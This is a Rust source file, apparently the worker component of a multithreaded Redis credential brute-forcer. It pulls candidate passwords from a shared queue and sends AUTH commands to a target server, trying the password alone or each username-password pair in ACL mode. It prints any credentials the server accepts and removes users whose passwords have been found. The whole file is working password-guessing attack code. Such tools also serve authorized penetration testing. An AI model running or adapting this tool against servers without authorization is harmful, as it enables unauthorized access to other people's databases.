use crate::Args;
use std::process;
use parking_lot::RwLock;
use std::sync::{Arc};
use crossbeam_queue::{SegQueue};

use crate::connection::Connection;

// https://redis.io/docs/management/security/acl/
// Old redis or just requirepass can just pass AUTH <password>
// This auths against the "default" user either way
// With an ACL mode we use a user and password
// AUTH <user> <password>
enum RedisMode {
    DEFAULT,
    ACL
}

pub struct Worker {
    users: Arc<RwLock<Vec<String>>>,
    q: Arc<SegQueue<String>>,
    connection: Connection,
    current_password: String,
    finished_users: Vec<usize>,
    mode: RedisMode
}

impl Worker {
    pub fn run_queue(&mut self) {
        while !self.q.is_empty() {
            match self.q.pop() {
                Some(password) => {
                    self.current_password = password;
                    self.check_password();
                },
                None => continue,
            }
        }
    }

    fn check_non_acl(&mut self) {
        let response = self.connection.send_and_receive(format!("AUTH '{}'\r\n", self.current_password));

        if response[0] == 43 {
            println!("[+] Valid password found - {}", &self.current_password);
            process::exit(1);
        }
    }

    fn check_acl(&mut self) {
        let users_read = self.users.read();
        for (pos, user) in users_read.iter().enumerate() {
            let response = self
                                    .connection
                                    .send_and_receive(format!("AUTH '{}' '{}'\r\n", user, self.current_password));
            if response[0] == 43 {
                println!("[+] Valid credentials found - {user}:{}", &self.current_password);
                self.finished_users.push(pos);
            }
        }
    }

    fn clean_found_users(&mut self) {
        let mut users_write = self.users.write();

        let mut removed = 0;
        for position in self.finished_users.iter() {
            users_write.remove(position - removed);
            removed += 1;
        }

        if removed > 0 {
            if users_write.len() == 0 {
                println!("[*] Valid credentials found for all possible users, exiting.");
                process::exit(1);
            } else {
                println!("[?] {} user(s) remaining...", users_write.len());
            }
        }

        self.finished_users.clear();
    }

    fn check_password(&mut self) {
        match self.mode {
            RedisMode::DEFAULT => {
                self.check_non_acl();
            },
            RedisMode::ACL => {
                self.check_acl();
                if self.finished_users.len() > 0 {
                    self.clean_found_users();
                }
            }
        }
    }
}

impl Worker {
    pub fn new(users: Arc<RwLock<Vec<String>>>, q: Arc<SegQueue<String>>, args: Arc<Args>) -> Worker {
        let mode = if args.users == "" { RedisMode::DEFAULT } else { RedisMode::ACL };
        Worker { 
            users: users, 
            q: q, 
            connection: Connection::new(&args.ip, &args.port),
            current_password: String::new(),
            mode: mode,
            finished_users: Vec::new()
        }
    }
}